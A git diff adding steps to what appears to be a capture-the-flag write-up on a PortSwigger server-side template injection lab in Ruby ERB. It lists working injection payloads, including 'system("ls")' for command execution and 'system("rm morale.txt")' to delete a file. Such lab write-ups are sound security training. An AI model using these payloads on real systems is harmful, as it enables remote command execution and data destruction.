@@ -174,8 +174,36 @@ When I click on “View details” btn a message appears “Unfortunately this p
 
 Then I tried some ssti payload and it worked this payload `<%= 7*7 %>` and showed me `49`
 
+```url
+/?message=<%= 7*7 %>
+```
+
 ![Screenshot 2023-12-31 094728](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/5f7dd076-a44f-4553-bc9a-38754604b8cc)
  the ERB documentation, discover that the syntax <%= someExpression %> is used to evaluate an expression and render the result on the page.
+
+    /?message=<%= someExpression %>
+
+![Screenshot 2023-12-31 094759](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/52c12768-a3e8-490c-b3d5-4bd46d8d44b5)
+
+then i write the exploit with Ruby and this is payload 
+
+    /?message=<%= system("ls") %>
+
+there are file called `morale.txt` 
+
+![Screenshot 2023-12-31 100202](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/ddda3f5e-57d7-4bdb-9a01-25704e9a6c80)
+
+when i deleted it the lab solved and this is final payload
+
+    /?message=<%= system("rm morale.txt") %>
+
+![Screenshot 2023-12-31 100253](https://github.com/MohammedHawary/Web-Penetration/assets/94152045/18bb1457-569a-4fea-8db3-0d743330f280)
+
+[Python Script for this lab]([Solve-Portswigger-Labs-With_py/SSTI/Basic_server_side_template_injection.py at main · MohammedHawary/Solve-Portswigger-Labs-With_py (github.com)](https://github.com/MohammedHawary/Solve-Portswigger-Labs-With_py/blob/main/SSTI/Basic_server_side_template_injection.py))
+
+
+
+
 
 
 
